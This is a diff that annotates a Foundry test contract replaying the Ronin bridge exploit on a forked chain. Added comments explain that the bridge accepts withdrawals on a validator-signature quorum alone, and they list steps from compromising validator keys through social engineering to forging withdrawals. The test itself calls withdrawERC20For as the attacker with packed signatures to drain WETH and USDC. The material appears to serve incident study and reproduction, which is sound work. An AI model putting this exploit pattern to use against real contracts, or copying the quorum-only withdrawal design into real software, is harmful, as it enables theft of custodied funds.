@@ -15,6 +15,24 @@ interface IRoninBridge {
     ) external;
 }
 
+// VULNERABILITY: Unauthorized withdrawal via forged validator signatures (quorum met with compromised keys; ID-only used-as-nonce with no sidechain proof)
+// In MainchainGatewayProxy (this file delegates to impl) + MainchainGatewayStorage:
+//   withdrawals mapping (line ~561) is a simple used-ID tracker: mapping(uint256 => WithdrawalEntry)
+//   struct WithdrawalEntry { address owner; address tokenAddress; uint256 tokenNumber; }
+//   (deposits use a counter + array, but withdrawals do not; _withdrawalId supplied by caller)
+// In sources/MainchainValidator_42B19d/MainchainValidator.sol:checkThreshold (and inherited Validator):
+//   return _voteCount.mul(denom) >= num.mul(validatorCount);
+// The (unshown but inferred from PoC+storage) withdrawERC20For in the impl does ecrecover on packed _signatures, counts valid distinct isValidator() signers, requires checkThreshold(count), then does the transfer + write to withdrawals[_withdrawalId].
+// No other checks: no sidechain proof, withdrawalId not derived/sequential, no amount caps, permissionless caller.
+
+// EXPLOIT STEPS:
+// 1. Compromise 5 validator private keys off-chain (social engineering on Sky Mavis staff + temp key delegation abuse).
+// 2. Construct withdrawal tuples for arbitrary _withdrawalId (high unused values 2000000/2000001), attacker as _user, WETH/USDC, huge _amount.
+// 3. Locally sign the withdrawal hash with each of 5 keys => produce the packed _signatures bytes (330 bytes, each sig prefixed 0x01 + 65-byte rsv).
+// 4. At forked block, prank as attacker and invoke IRoninBridge(roninBridge).withdrawERC20For(...) for WETH drain.
+// 5. Same for second USDC drain. Both succeed because sig count meets threshold, ID unused in the withdrawals mapping, and bridge holds the tokens.
+// 6. (Implicit) The two calls empty the custodial bridge reserves. No on-chain event from Ronin sidechain is required or verified.
+
 contract ContractTest is Test {
     address attacker = 0x098B716B8Aaf21512996dC57EB0615e2383E2f96;
     address roninBridge = 0x1A2a1c938CE3eC39b6D47113c7955bAa9DD454F2;
@@ -29,6 +47,10 @@ contract ContractTest is Test {
     function testExploit() public {
         cheats.startPrank(attacker);
 
+        // VULNERABILITY TRIGGER: first forged withdrawal (WETH)
+        // See detailed VULNERABILITY + EXPLOIT STEPS comments above.
+        // Calls into proxy -> delegatecall MainchainGatewayManager.withdrawERC20For
+        // which only validates quorum sigs (no sidechain backing).
         IRoninBridge(roninBridge).withdrawERC20For({ // 0x993e1c42
             _withdrawalId: 2_000_000,
             _user: attacker,
@@ -37,6 +59,8 @@ contract ContractTest is Test {
             _signatures: hex"01175db2b62ed80a0973b4ea3581b22629026e3c6767125f14a98dc30194a533744ba284b5855cfbc34c1416e7106bd1d4ce84f13ce816370645aad66c0fcae4771b010984ea09911beeadcd3dab46621bc81071ba91ce24d5b7873bc6a34e34c6aafa563916059051649b3c1930425aa3a79a293cacf24a21bda3b2a46a1e3d39a6551c01f962ee0e333c2f7261b3077bb7b7544001d555df4bc2e6a5cae2b2dac3d1fe3875cd1d12fadbeb4c01f01e196aa36e395a94de074652971c646b4b3b7149b3121b0178bd67c4fa659087c5f7696d912dee9db37802a3393bf4bd799e22eb201e78d90dc3f57e99d8916cd0282face42324f3afa0d96b0a09c4f914f15cac9c11037b1b0102b7a3a587c5be368f324893ed06df7bdcd3817b1880bd6dada86df15bd50d275fc694a8914d1818a2d432f980a97892f303d5a893a3eec176f46957958ecb991c"
         });
 
+        // VULNERABILITY TRIGGER: second forged withdrawal (USDC)
+        // Same path; different hash, same validator quorum satisfied by compromised keys.
         IRoninBridge(roninBridge).withdrawERC20For({ // 0x993e1c42
             _withdrawalId: 2_000_001,
             _user: attacker,
